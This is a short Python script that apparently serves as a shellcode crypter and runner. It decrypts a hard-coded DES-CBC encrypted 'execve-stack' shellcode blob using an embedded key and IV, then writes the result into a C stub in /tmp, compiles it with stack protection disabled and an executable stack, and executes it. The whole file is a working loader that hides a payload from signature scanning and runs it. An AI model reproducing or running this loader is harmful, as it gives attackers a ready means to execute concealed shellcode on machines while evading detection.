from Crypto.Cipher import DES
import os

def decrypt_shellcode(key, shellcode, iv):

	des = DES.new(key, DES.MODE_CBC, iv)
	
	encrypted_text_formatted = shellcode.replace("\\x","")
	encrypted_text_decoded = encrypted_text_formatted.decode('hex')
	decrypted_text = des.decrypt(encrypted_text_decoded)

	print "Decrypting shellcode...\n"
	print decrypted_text
	return decrypted_text

def execute_shellcode(decrypted_shellcode):
	f = open(os.path.join("/tmp", 'shellcode.c'), 'w')
	data = """#include <stdio.h>
#include <string.h>

unsigned char code[] = "%s" ;
main()
{

	int (*ret)() = (int(*)())code;

	ret();
}\n""" % decrypted_shellcode

	f.write(data)
	f.close()
	
	print "Running it now...\n"
	os.system('gcc -fno-stack-protector -z execstack /tmp/shellcode.c -o /tmp/shellcode && /tmp/shellcode')

def main():

	key = "v5sD3GE4"  # needs to be 8 bytes
	iv = "hoqCHQE6"   # needs to be 8 bytes

	#execve-stack DES CBC encrypted shellcode
	shellcode = r"\x3d\xf3\xed\x10\x01\xda\xf7\x35\xfd\x9b\xf3\xb9\xe0\xb8\x35\x01\x75\x75\xf4\x3c\xfb\x45\xdb\x29\xfe\x59\x70\x5d\x69\xea\xd1\x5d\xf8\xa0\x3c\xa2\xe3\x09\xd1\xb7\x9f\x3c\xac\x70\x4a\x60\xec\x1d\xa5\x7d\x62\x67\x02\xf2\x3c\x15\xd4\x11\xb5\xdc\x47\x12\xf7\x96\x3f\x5c\x7e\xb6\x26\xc3\xa1\x07\xc6\xee\xee\x9e\xcd\xc4\x8a\xf0\x2e\xf2\xda\xcf\x94\xf7\xbc\x73\x19\x6c\x03\x12\xee\xef\xca\x27\x14\xaf\xf4\x6c\x06\xe2\xdb\xba\x43\x87\x1f\xd0\xec\x1b\xae\xd0\x8a\x8e\x2b\x15\xaf\x86\x61\xc1\x88\x40\x00\x5e\x23\xc1\x7a\x31"
	
	decrypted_shellcode = decrypt_shellcode(key, shellcode, iv)
	execute_shellcode(decrypted_shellcode)

if __name__ == '__main__':
    main()